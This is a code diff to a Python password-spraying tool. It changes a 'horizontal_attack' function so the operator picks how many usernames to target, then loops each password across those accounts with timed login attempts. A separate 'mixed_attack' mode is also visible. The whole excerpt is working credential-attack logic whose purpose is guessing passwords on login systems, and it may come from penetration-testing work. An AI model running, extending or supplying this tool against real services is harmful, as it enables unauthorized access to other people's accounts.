@@ -100,12 +100,25 @@ def horizontal_attack(sleep_time):
     """Perform horizontal brute-force attack (one password across all users)."""
     failed_attempts = 0
 
+    # Get the number of usernames to attack
+    try:
+        num_users = int(input(f"Enter the number of usernames to attack (max {len(usernames)}): "))
+        if num_users > len(usernames):
+            print(f"Number exceeds available usernames. Attacking all {len(usernames)} usernames.")
+            num_users = len(usernames)  # Set to maximum available usernames
+    except ValueError:
+        print("Invalid input. Attacking all usernames.")
+        num_users = len(usernames)
+
+    # Slice the usernames list to include only the selected number of usernames
+    targeted_usernames = usernames[:num_users]
+
     session = get_new_session()  # Obtain a new session
 
     for password in passwords:
-        print(f"{YELLOW}[INFO]{RESET} Attempting Password: {password} across all users")
+        print(f"{YELLOW}[INFO]{RESET} Attempting Password: {password} across {num_users} user(s)")
 
-        for username in usernames:
+        for username in targeted_usernames:
             success, response = attempt_login(session, username, password)
 
             if success:
@@ -123,6 +136,7 @@ def horizontal_attack(sleep_time):
                 return
 
             time.sleep(sleep_time)
+
 
 
 def mixed_attack(sleep_time):
